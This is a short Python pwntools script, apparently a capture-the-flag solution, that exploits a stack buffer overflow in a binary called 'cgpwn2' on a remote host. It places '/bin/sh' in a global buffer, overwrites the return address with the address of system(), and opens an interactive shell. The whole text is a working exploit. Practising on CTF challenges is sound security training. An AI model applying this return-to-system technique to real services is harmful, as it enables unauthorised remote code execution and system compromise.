from pwn import * 
#p = process('./cgpwn2')
p = remote("111.198.29.45",55563)
elf = ELF('./cgpwn2')
p.recv()
p.sendline("/bin/sh\x00");
p.recv()
bin_addr = elf.search("/bin/sh\x00")
pwn_addr = elf.symbols['pwn']
sys_addr = elf.symbols['system']
fgets_addr = elf.symbols['fgets']
payload = flat(['A' * 0x2a , sys_addr,0xdeadbeef,0x0804A080])
p.sendline(payload)
#gdb.attach(p)

p.interactive()
